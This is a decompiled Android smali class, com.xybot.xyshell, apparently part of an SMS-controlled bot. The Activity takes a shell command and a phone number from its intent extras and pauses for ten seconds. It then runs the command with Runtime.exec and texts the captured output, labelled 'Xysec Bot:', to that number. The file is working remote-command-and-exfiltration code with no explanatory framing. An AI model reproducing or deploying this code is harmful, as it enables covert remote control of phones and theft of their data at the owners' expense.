.class public Lcom/xybot/xyshell;
.super Landroid/app/Activity;
.source "xyshell.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 16
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 28
    .parameter "savedInstanceState"

    .prologue
    .line 20
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/xyshell;->getIntent()Landroid/content/Intent;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v13

    .line 23
    .local v13, bundle:Landroid/os/Bundle;
    const-string v4, "shell"

    invoke-virtual {v13, v4}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v25

    .line 24
    .local v25, str:Ljava/lang/String;
    const-string v4, "num"

    invoke-virtual {v13, v4}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 27
    .local v3, num:Ljava/lang/String;
    const-wide/16 v26, 0x2710

    :try_start_0
    invoke-static/range {v26 .. v27}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_3

    .line 33
    :goto_0
    new-instance v23, Ljava/lang/StringBuffer;

    const-string v4, ""

    move-object/from16 v0, v23

    invoke-direct {v0, v4}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 34
    .local v23, sb:Ljava/lang/StringBuffer;
    const-string v16, ""

    .line 35
    .local v16, line:Ljava/lang/String;
    const-string v4, "line.separator"

    invoke-static {v4}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 37
    .local v8, NL:Ljava/lang/String;
    const-string v4, "testing"

    move-object/from16 v0, v25

    invoke-static {v4, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 39
    const/16 v19, 0x0

    .line 41
    .local v19, process:Ljava/lang/Process;
    :try_start_1
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v4

    move-object/from16 v0, v25

    invoke-virtual {v4, v0}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v19

    .line 47
    const-string v4, "testing22"

    move-object/from16 v0, v25

    invoke-static {v4, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 52
    new-instance v21, Ljava/io/BufferedReader;

    .line 53
    new-instance v4, Ljava/io/InputStreamReader;

    invoke-virtual/range {v19 .. v19}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v7

    invoke-direct {v4, v7}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 52
    move-object/from16 v0, v21

    invoke-direct {v0, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 55
    .local v21, reader:Ljava/io/BufferedReader;
    const/16 v4, 0x1000

    new-array v12, v4, [C

    .line 56
    .local v12, buffer:[C
    new-instance v17, Ljava/lang/StringBuffer;

    invoke-direct/range {v17 .. v17}, Ljava/lang/StringBuffer;-><init>()V

    .line 58
    .local v17, output:Ljava/lang/StringBuffer;
    :goto_1
    :try_start_2
    move-object/from16 v0, v21

    invoke-virtual {v0, v12}, Ljava/io/BufferedReader;->read([C)I
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1

    move-result v20

    .local v20, read:I
    if-gtz v20, :cond_0

    .line 66
    const-string v4, "testing33"

    move-object/from16 v0, v25

    invoke-static {v4, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 68
    :try_start_3
    invoke-virtual/range {v21 .. v21}, Ljava/io/BufferedReader;->close()V
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_2

    .line 77
    :try_start_4
    invoke-virtual/range {v19 .. v19}, Ljava/lang/Process;->waitFor()I
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_4

    .line 82
    :goto_2
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v22

    .line 83
    .local v22, ret:Ljava/lang/String;
    const-string v4, "output"

    move-object/from16 v0, v22

    invoke-static {v4, v0}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 84
    const-string v4, "number"

    invoke-static {v4, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 88
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    .line 89
    .local v2, smsMgr:Landroid/telephony/SmsManager;
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v7, "Xysec Bot: "

    invoke-direct {v4, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v22

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Landroid/telephony/SmsManager;->divideMessage(Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v5

    .line 90
    .local v5, messages:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    const-string v9, "SMS_ADDRESS_PARAM"

    .line 91
    .local v9, SMS_ADDRESS_PARAM:Ljava/lang/String;
    const-string v10, "SMS_DELIVERY_MSG_PARAM"

    .line 92
    .local v10, SMS_DELIVERY_MSG_PARAM:Ljava/lang/String;
    const-string v11, "com.tilab.msn.SMS_SENT"

    .line 93
    .local v11, SMS_SENT_ACTION:Ljava/lang/String;
    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    .line 94
    .local v6, listOfIntents:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    const/4 v15, 0x0

    .local v15, i:I
    :goto_3
    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-lt v15, v4, :cond_1

    .line 102
    const/4 v4, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendMultipartTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/util/ArrayList;Ljava/util/ArrayList;Ljava/util/ArrayList;)V

    .line 104
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/xyshell;->finish()V

    .line 107
    return-void

    .line 42
    .end local v2           #smsMgr:Landroid/telephony/SmsManager;
    .end local v5           #messages:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v6           #listOfIntents:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    .end local v9           #SMS_ADDRESS_PARAM:Ljava/lang/String;
    .end local v10           #SMS_DELIVERY_MSG_PARAM:Ljava/lang/String;
    .end local v11           #SMS_SENT_ACTION:Ljava/lang/String;
    .end local v12           #buffer:[C
    .end local v15           #i:I
    .end local v17           #output:Ljava/lang/StringBuffer;
    .end local v20           #read:I
    .end local v21           #reader:Ljava/io/BufferedReader;
    .end local v22           #ret:Ljava/lang/String;
    :catch_0
    move-exception v14

    .line 45
    .local v14, e:Ljava/io/IOException;
    new-instance v4, Ljava/lang/RuntimeException;

    invoke-direct {v4, v14}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v4

    .line 59
    .end local v14           #e:Ljava/io/IOException;
    .restart local v12       #buffer:[C
    .restart local v17       #output:Ljava/lang/StringBuffer;
    .restart local v20       #read:I
    .restart local v21       #reader:Ljava/io/BufferedReader;
    :cond_0
    const/4 v4, 0x0

    :try_start_5
    move-object/from16 v0, v17

    move/from16 v1, v20

    invoke-virtual {v0, v12, v4, v1}, Ljava/lang/StringBuffer;->append([CII)Ljava/lang/StringBuffer;
    :try_end_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_1

    .line 61
    .end local v20           #read:I
    :catch_1
    move-exception v14

    .line 64
    .restart local v14       #e:Ljava/io/IOException;
    new-instance v4, Ljava/lang/RuntimeException;

    invoke-direct {v4, v14}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v4

    .line 69
    .end local v14           #e:Ljava/io/IOException;
    .restart local v20       #read:I
    :catch_2
    move-exception v14

    .line 72
    .restart local v14       #e:Ljava/io/IOException;
    new-instance v4, Ljava/lang/RuntimeException;

    invoke-direct {v4, v14}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v4

    .line 95
    .end local v14           #e:Ljava/io/IOException;
    .restart local v2       #smsMgr:Landroid/telephony/SmsManager;
    .restart local v5       #messages:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .restart local v6       #listOfIntents:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    .restart local v9       #SMS_ADDRESS_PARAM:Ljava/lang/String;
    .restart local v10       #SMS_DELIVERY_MSG_PARAM:Ljava/lang/String;
    .restart local v11       #SMS_SENT_ACTION:Ljava/lang/String;
    .restart local v15       #i:I
    .restart local v22       #ret:Ljava/lang/String;
    :cond_1
    new-instance v24, Landroid/content/Intent;

    const-string v4, "com.tilab.msn.SMS_SENT"

    move-object/from16 v0, v24

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 96
    .local v24, sentIntent:Landroid/content/Intent;
    const-string v4, "SMS_ADDRESS_PARAM"

    move-object/from16 v0, v24

    invoke-virtual {v0, v4, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 97
    const-string v7, "SMS_DELIVERY_MSG_PARAM"

    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v4

    const/16 v26, 0x1

    move/from16 v0, v26

    if-le v4, v0, :cond_2

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v26, "Part "

    move-object/from16 v0, v26

    invoke-direct {v4, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v15}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v26, " of SMS "

    move-object/from16 v0, v26

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    :goto_4
    move-object/from16 v0, v24

    invoke-virtual {v0, v7, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 98
    const/4 v4, 0x0

    const/high16 v7, 0x1000

    move-object/from16 v0, p0

    move-object/from16 v1, v24

    invoke-static {v0, v4, v1, v7}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v18

    .line 99
    .local v18, pi:Landroid/app/PendingIntent;
    move-object/from16 v0, v18

    invoke-virtual {v6, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 94
    add-int/lit8 v15, v15, 0x1

    goto :goto_3

    .line 97
    .end local v18           #pi:Landroid/app/PendingIntent;
    :cond_2
    const-string v4, "SMS "

    goto :goto_4

    .line 28
    .end local v2           #smsMgr:Landroid/telephony/SmsManager;
    .end local v5           #messages:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Ljava/lang/String;>;"
    .end local v6           #listOfIntents:Ljava/util/ArrayList;,"Ljava/util/ArrayList<Landroid/app/PendingIntent;>;"
    .end local v8           #NL:Ljava/lang/String;
    .end local v9           #SMS_ADDRESS_PARAM:Ljava/lang/String;
    .end local v10           #SMS_DELIVERY_MSG_PARAM:Ljava/lang/String;
    .end local v11           #SMS_SENT_ACTION:Ljava/lang/String;
    .end local v12           #buffer:[C
    .end local v15           #i:I
    .end local v16           #line:Ljava/lang/String;
    .end local v17           #output:Ljava/lang/StringBuffer;
    .end local v19           #process:Ljava/lang/Process;
    .end local v20           #read:I
    .end local v21           #reader:Ljava/io/BufferedReader;
    .end local v22           #ret:Ljava/lang/String;
    .end local v23           #sb:Ljava/lang/StringBuffer;
    .end local v24           #sentIntent:Landroid/content/Intent;
    :catch_3
    move-exception v4

    goto/16 :goto_0

    .line 78
    .restart local v8       #NL:Ljava/lang/String;
    .restart local v12       #buffer:[C
    .restart local v16       #line:Ljava/lang/String;
    .restart local v17       #output:Ljava/lang/StringBuffer;
    .restart local v19       #process:Ljava/lang/Process;
    .restart local v20       #read:I
    .restart local v21       #reader:Ljava/io/BufferedReader;
    .restart local v23       #sb:Ljava/lang/StringBuffer;
    :catch_4
    move-exception v4

    goto/16 :goto_2
.end method
